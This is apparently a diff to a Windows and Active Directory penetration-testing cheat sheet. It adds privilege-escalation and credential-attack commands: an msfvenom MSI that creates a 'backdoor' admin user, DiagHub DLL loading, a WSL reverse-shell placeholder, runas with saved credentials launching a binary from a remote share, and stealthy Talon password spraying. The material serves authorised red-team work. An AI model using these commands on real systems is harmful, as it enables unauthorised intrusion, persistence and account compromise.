@@ -43,6 +43,9 @@ wmic pagefile
 set # On cmd
 dir env: # On P$
 Get-ChildItem Env: | ft Key,Value # On P$
+wmic logicaldisk get caption | fsutil fsinfo drives # List drives
+wmic logicaldisk get caption,description,providername # List drives
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root # List drives
 ```
 
 You can try to see if [wesng](https://github.com/bitsadmin/wesng) say something interesting.
@@ -63,6 +66,8 @@ wmic useraccount get name,sid,fullname # Displays users using WMI
 quser # Identify active user sessions on a computer.
 wmic netlogin list /format:List # Display logon information
 Get-WmiObject Win32_LoggedOnUser # Display logon users
+Get-LocalUser | ft Name, Enabled, LastLogon
+Get-ChildItem C:\Users -Force | select Name
 klist sessions # Displays a list of logon sessions on this computer.
 ```
 
@@ -205,6 +210,7 @@ This means that they we have one of those accounts, we can query the Domain Cont
 ```bash
 ldapsearch -x -h 192.168.80.10 -D "USERNAME" -w PASSWORD -b "dc=BASELDAP,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
+
 
 ##### Powershell Transcript
 
@@ -668,6 +674,24 @@ For more information on those techniques:
 
 #### Task Scheduler
 
+##### Directory Access technique
+
+We need to see if we have access to the folder where all the tasks are stored. If yes, we can leverage that.
+
+```bash
+# Note that it don't show "C:\Windows\System32\Tasks"
+# So for instance a TaskPath with "Microsoft\XblGameSave" means "C:\Windows\System32\Tasks\Microsoft\XblGameSave"
+schtasks /query /fo LIST 2>nul | findstr TaskName
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
+
+
+icacls C:\Windows\system32\Tasks
+```
+
+For more information about that technique refer to [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
+
+##### SeImpersonatePrivilege technique
+
 First, let's have a look at the following [Microsoft Security Hardening feature](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-security-hardening) for scheduled tasks
 
 > *If RequiredPrivileges is not present in the task definition, the default privileges of task principal account without the SeImpersonatePrivilege will be used for task process. If ProcessTokenSidType is not present in the task definition, “unrestricted” is used as the default.*
@@ -678,6 +702,8 @@ However, within the Register-ScheduledTask cmdlet, we can perform some token man
 We need to pass the "-RequiredPrivilege" to the Register-ScheduledTask cmdlet in order to go around that
 
 [FullPowers](https://github.com/itm4n/FullPowers) is a tool that allows us to automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
+
+*Note that this tool should be executed as LOCAL SERVICE or NETWORK SERVICE only*
 
 ```bash
 # Simple recovery
@@ -700,7 +726,12 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevat
 
 You can then create a malicious msi binary and execute it.
 
-<https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated>
+```bash
+msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+msiexec /quiet /qn /i C:\evil.msi
+```
+
+There is a Metasploit module for it *exploit/windows/local/always_install_elevated*
 
 ### Scheduled Tasks Enumeration
 
@@ -745,6 +776,13 @@ wmic service get pathname,startname
 Get-Service | where object {$ .status -eq ''Running''}
 # Search for "Unquoted Service Path" vulnerable services
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v 
+
+# Automated script to list all services path
+sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
 ```
 
 If there is are path that contains whitespace and run as *LocalSystem*, Unquoted Service Path vulnerability.
@@ -992,6 +1030,14 @@ Check the last leter within the parantheses which is interpretted as the followi
 
 For more information about that technique refer to [T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
 
+#### Vulnerable Drivers
+
+[DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery) search for vulnerable drivers that are loaded.
+
+```bash
+DriverQuery.exe --no-msft
+```
+
 #### DLL hijacking
 
 DLL hijacking is an attack involves a  DLL taking over from a legitimate DLL.
@@ -1183,6 +1229,33 @@ Copied from [here](https://itm4n.github.io/dll-proxying/)
 ....
 ```
 
+#### Privileged File Write
+
+Processes running with high privileges perform operations on files like all processes do.
+
+this can become a security vulnerability, as there is potential to abuse the operations performed by that privileged process to make it do something it is not supposed to.
+
+##### DiagHub Vulneranility
+
+:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.
+
+The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the C:\Windows\System32 directory.
+
+[Diaghub](https://github.com/xct/diaghub) loads a custom dll in system32 via diaghub
+
+```bash
+diaghub.exe c:\\ProgramData\\ MALICIOUS.dll
+```
+
+##### Update Session Orchestrator Vulnerability
+
+Update Session Orchestrator is the replacement of the Windows Update agent.
+
+If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of **windowscoredeviceinfo.dll** into C:\Windows\Sytem32\ and then have it loaded by the USO service to get arbitrary code execution as **NT AUTHORITY\System**.
+
+If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of windowscoredeviceinfo.dll into C:\Windows\Sytem32\ and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\System.
+
+
 #### AppInit DLLs
 
 The AppInit_DLLs infrastructure provides an easy way to hook system APIs by allowing custom DLLs to be loaded into the address space of every interactive application.
@@ -1268,6 +1341,15 @@ A common language runtime (CLR) profiler is a dynamic link library (DLL) that co
 
 From a security perspective from Microsoft
 > A profiler DLL is an unmanaged DLL that runs as part of the common language runtime execution engine. As a result, the code in the profiler DLL is not subject to the restrictions of managed code access security. The only limitations on the profiler DLL are those imposed by the operating system on the user who is running the profiled application.
+
+### Windows Subsystem for Linux
+
+```bash
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
+```
 
 ### Application Shimming
 
@@ -1508,6 +1590,21 @@ It currently extracts:
 
 The hashcat mode is 2100
 
+#### RunAs
+
+[cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) Creates, lists, and deletes stored user names and passwords or credentials.
+
+```bash
+# List the stored credentials on the machine
+cmdkey /list
+```
+
+If there is an administrator that is password are saved, we can leverage it.
+
+```bash
+runas /savecred /user:WORKGROUP\Administrator "\\IP\SHARE\BINARY.exe"
+```
+
 #### LSA Secrets
 
 LSA Secrets are stored in the following registry key *HKEY_LOCAL_MACHINE/Security/Policy/Secrets*
@@ -1618,6 +1715,48 @@ mimikatz # sekurlsa::ekeys      #
 ```
 
 With this password hash, we can perform pass the hash to compromise the Active Directory.
+
+##### Brute-force
+
+###### Talon
+
+Talon is an automated authentication tool for large scale attacks while remaining less detectable.
+
+This is done by:
+
+- Using both a combination of both LDAP and Kerberos protocols by alternating between the two services
+- Using a single or multiple domain controllers  
+
+Command options:
+
+- **-D**: Fully qualified domain to use
+- **-Hostfile**: File containing the list of domain controllers to connect to
+- **-P**: Password to use
+- **-Userfile**: File containing the list of usernames
+- **-sleep**: Time inbetween attempts (default 0.5)
+
+There are two mode:
+
+- **Enumeration Mode (-E)**: Send only Kerberos TGT pre-authentication request to the target KDC.
+This is done by using checking the encrypted TGT ticket resulting from the request:
+
+|Error ID|Code Name|Reason|
+|-|-|-|
+|**6**|KDC_ERR_C_PRINCIPAL_UNKNOWN|The username doesn't exist.|
+|**18**|KDC_ERR_CLIENT_REVOKED|Account disabled, expired, or locked out.|
+|**24**|KDC_ERR_PREAUTH_FAILED|Pre-authentication failed; usually means bad password|
+
+```bash
+./Talon -D DOMAIN.LOCAL -Hostfile DC.txt -Userfile USERNAME.txt -sleep 1 -E
+```
+
+*Note that it increment the [Bad-Pwd-Count](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) as well*
+
+- **Automated Password Guessing Mode**: Perform password guessing by alternating between the two services, allowing the password attack traffic to be split across two protocols. Talon can take one step further, by distributing a password attack against multiple domain controllers (**-Hostfile**), alternating between LDAP and Kerberos each time to create an additional layer of obscurity.
+
+```bash
+./Talon -D DOMAIN.LOCAL -Hostfile DC.txt -Userfile USERNAME.txt -P "PASSWORD" -sleep 1
+```
 
 ###### *If you don't know, now you know: [Security Accounts Manager database](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v=ws.11)#security-accounts-manager-database)*
 
@@ -2128,7 +2267,9 @@ This vulnerability allows an attacker to abuse Windows system services to conduc
 - For the "Group Managed Service Accounts" part, thanks to Sean Metcalf <https://adsecurity.org/?p=4367>
 - For the "AdminSDHolder" part, thanks to harmj0y <http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/>
 - For the "Credential Manager" part, thanks to Raj Chandel <https://www.hackingarticles.in/credential-dumping-windows-credential-manager/>
-- For the "DLL Proxying" part, thank to <https://itm4n.github.io/dll-proxying/>
+- For the "DLL Proxying" part, thanks to itm4n <https://itm4n.github.io/dll-proxying/>
+- For the "Task Scheduler" part, thanks to itm4n <https://itm4n.github.io/localservice-privileges/>
+- For the "Windows Subsystem for Linux" part, thanks to <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl>
 
 #### Source Todo
 
